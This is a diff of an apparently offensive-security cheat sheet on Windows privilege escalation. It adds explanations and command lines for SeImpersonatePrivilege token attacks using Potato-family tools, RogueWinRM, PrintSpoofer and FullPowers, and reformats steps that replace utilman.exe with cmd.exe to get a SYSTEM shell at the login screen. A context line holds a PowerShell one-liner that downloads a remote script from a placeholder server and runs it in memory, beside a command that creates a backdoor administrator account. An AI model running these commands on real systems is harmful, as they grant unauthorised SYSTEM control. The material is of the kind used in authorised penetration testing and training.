@@ -386,9 +386,9 @@ The procedure to do so is as follow:
   4. Select the “Use recovery tools [...]" option, pick the operating system
      from the list and click "Next"
   5. A command prompt should open, enter the following commands:
-      - cd windows\system32
-      - ren utilman.exe utilman.exe.bak
-      - copy cmd.exe utilman.exe
+      - `cd windows\system32`
+      - `ren utilman.exe utilman.exe.bak`
+      - `copy cmd.exe utilman.exe`
   6. Remove the CD/DVD and boot the system normally.
   7. On the login screen, press the key combination Windows Key + U
   8. A command prompt should open with NT AUTHORITY\SYSTEM rights
@@ -1187,7 +1187,7 @@ The C code above can be compiled on Linux using the  cross-compiler `mingw`
 The service can be leveraged to start a privileged reverse shell. Refer to the
 `[General] Shells - Binary` note.  
 
-####### Service restart
+###### Service restart
 
 To restart the service:
 
@@ -1309,9 +1309,34 @@ to a token of the `NT AUTHORITY\SYSTEM` account:
 
 | Tool(s) | Description | Technique limitation |
 |---------|-------------|----------------------|
-| Potato family ([`Potato`](https://github.com/foxglovesec/Potato), [`RottenPotatoNG`](https://github.com/breenmachine/RottenPotatoNG), [`Juicy Potato`](https://github.com/ohpe/juicy-potato)) | Induces the SYSTEM account to connect to a controlled `RPC` endpoint using the `CoGetInstanceFromIStorage ` `COM` API function. <br> In `Potato` and `RottenPotatoNG`, the call was used to instantiate a `COM Storage Object` of the `BITS` local service. In `Juicy Potato`, an instance of the service specified in parameter, using its `Class Identifier (CLSID)`, is requested. <br><br> Then the packets received by the controlled RPC endpoint are relayed to the `MSRPC` endpoint (on port TCP 135) until an NTLM authentication attempt of the SYSTME account is received. <br><br> The `NTLM` authentication attempt is replayed using Windows API calls (`AcquireCredentialsHandle` and `AcceptSecurityContext`) to ultimately obtain a token for the SYSTEM account. | Restriction applied starting from the Windows 10 1809 and Windows Server 2019 operating system mitigate this attack. <br><br> Indeed the port contacted by the `COM` API function is now fixed to the `MSRPC` endpoint and can not longer be specified, resulting in an impossibility to intercept the NTLM authentication attempt. |
-| [`RogueWinRM`](https://github.com/antonioCoco/RogueWinRM) | Exploit the fact that upon starting the `BITS` service attempt an NTLM authentication to the `WinRM` service (on port 5985). <br><br> Similarly to the exploitation process of tools from the Potato family, the `NTLM` authentication attempt is relayed through Windows API calls to obtain a token for the SYSTEM account. | Requires that the `WinRM` service is not running (default configuration on Windows workstation operating systems, including Windows 10, but not on Windows server operating systems). |
-| [`PrintSpoofer`](https://github.com/itm4n/PrintSpoofer) | | |
+| Potato family ([`Potato`](https://github.com/foxglovesec/Potato), [`RottenPotatoNG`](https://github.com/breenmachine/RottenPotatoNG), [`Juicy Potato`](https://github.com/ohpe/juicy-potato)) | Induces the `SYSTEM` account to connect to a controlled `RPC` endpoint using the `CoGetInstanceFromIStorage ` `COM` API function. <br> In `Potato` and `RottenPotatoNG`, the call was used to instantiate a `COM Storage Object` of the `BITS` local service. In `Juicy Potato`, an instance of the service specified in parameter, using its `Class Identifier (CLSID)`, is requested. <br><br> Then the packets received by the controlled `RPC` endpoint are relayed to the `MSRPC` endpoint (on port TCP 135) until an `NTLM` authentication attempt of the `SYSTEM` account is received. <br><br> The `NTLM` authentication attempt is replayed using Windows API calls (`AcquireCredentialsHandle` and `AcceptSecurityContext`) to ultimately obtain a token for the `SYSTEM` account. | Restriction applied starting from the `Windows 10 1809` and `Windows Server 2019` operating system mitigate this attack. <br><br> Indeed the port contacted by the `COM` API function is now fixed to the `MSRPC` endpoint and can not longer be specified, resulting in an impossibility to intercept the NTLM authentication attempt. |
+| [`RogueWinRM`](https://github.com/antonioCoco/RogueWinRM) | Exploit the fact that upon starting the `BITS` service attempt an `NTLM` authentication to the `WinRM` service (on port 5985). <br><br> Similarly to the exploitation process of tools from the Potato family, the `NTLM` authentication attempt is relayed through Windows API calls to obtain a token for the `SYSTEM` account. | Requires that the `WinRM` service is not running (default configuration on Windows workstation operating systems, including `Windows 10`, but not on Windows server operating systems). |
+| [`PrintSpoofer`](https://github.com/itm4n/PrintSpoofer) | Induces the `SYSTEM` account to connect to a controlled `named pipe` using the `RpcRemoteFindFirstPrinterChangeNotification(Ex)` function of the `Print System Remote Protocol` exposed on the `MS-RPRN` `MSRPC` interface (also known as "Printer Bug"). <br><br> Once the `SYSTEM` account is connected to the controlled `named pipe`, it can be impersonated using the `ImpersonateNamedPipeClient` Win32 API function. | Requires the `Print Spooler` service to be running (or startable by the current user) on the host. |
+
+###### Local service accounts privileges reduction
+
+The `NT AUTHORITY\LOCAL SERVICE` and `NT AUTHORITY\NETWORK SERVICE` are
+predefined local accounts notably used by the `Service Control Manager`. By
+default, the accounts are granted the `SeImpersonatePrivilege` privilege.
+
+However, some Windows services executed as `NT AUTHORITY\LOCAL SERVICE` or
+`NT AUTHORITY\NETWORK SERVICE` will voluntarily limit their privileges and
+remove the `SeImpersonatePrivilege` from their access token. In such cases, the
+default privileges normally granted to the service accounts can be retrieved by
+creating a scheduled task; as the scheduled task process will have all the
+default privileges restored.
+
+[FullPowers](https://github.com/itm4n/FullPowers) can be used to automate this
+process:
+
+```
+# Spawns a new interactive cmd.exe interpreter in place.
+FullPowersFullPowers -x
+
+# Execute the specified command.
+# -z: Non-interactive process.
+FullPowersFullPowers -x [-z] -c <COMMAND>
+```
 
 ###### Juicy Potato
 
@@ -1371,6 +1396,35 @@ Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup adm
 
 # Memory injection and run
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
+```
+
+###### RogueWinRM
+
+Starting from `Windows 10 1809` (and `Windows Server 2019` if the `WinRM`
+service is not already started), `RogueWinRM` can be used to exploit the
+`SeImpersonatePrivilege` privilege.
+
+```
+RogueWinRM -p <BINARY_PATH | C:\windows\system32\cmd.exe> [-a "<COMMAND_LINE_ARGUMENTS>"]
+```
+
+###### PrintSpoofer
+
+If the `Print Spooler` service is running locally (or can be started),
+`PrintSpoofer` can be used to exploit the `SeImpersonatePrivilege` privilege
+(tested on `Windows 10` and `Windows Server 2016 / 2019`).
+
+```
+# Checks if the Print Spooler service is running.
+sc qc Spooler
+Get-Service -Name Spooler
+
+# Attempts to start the Print Spooler service.
+net start Spooler
+Start-Service -Name Spooler
+
+# -i: interactive process. Default is non-interactive.
+PrintSpoofer.exe [-i] -c "<cmd.exe | powershell.exe | BINARY_PATH | cmd.exe COMMAND_LINE_ARGUMENTS | ...>"
 ```
 
 --------------------------------------------------------------------------------
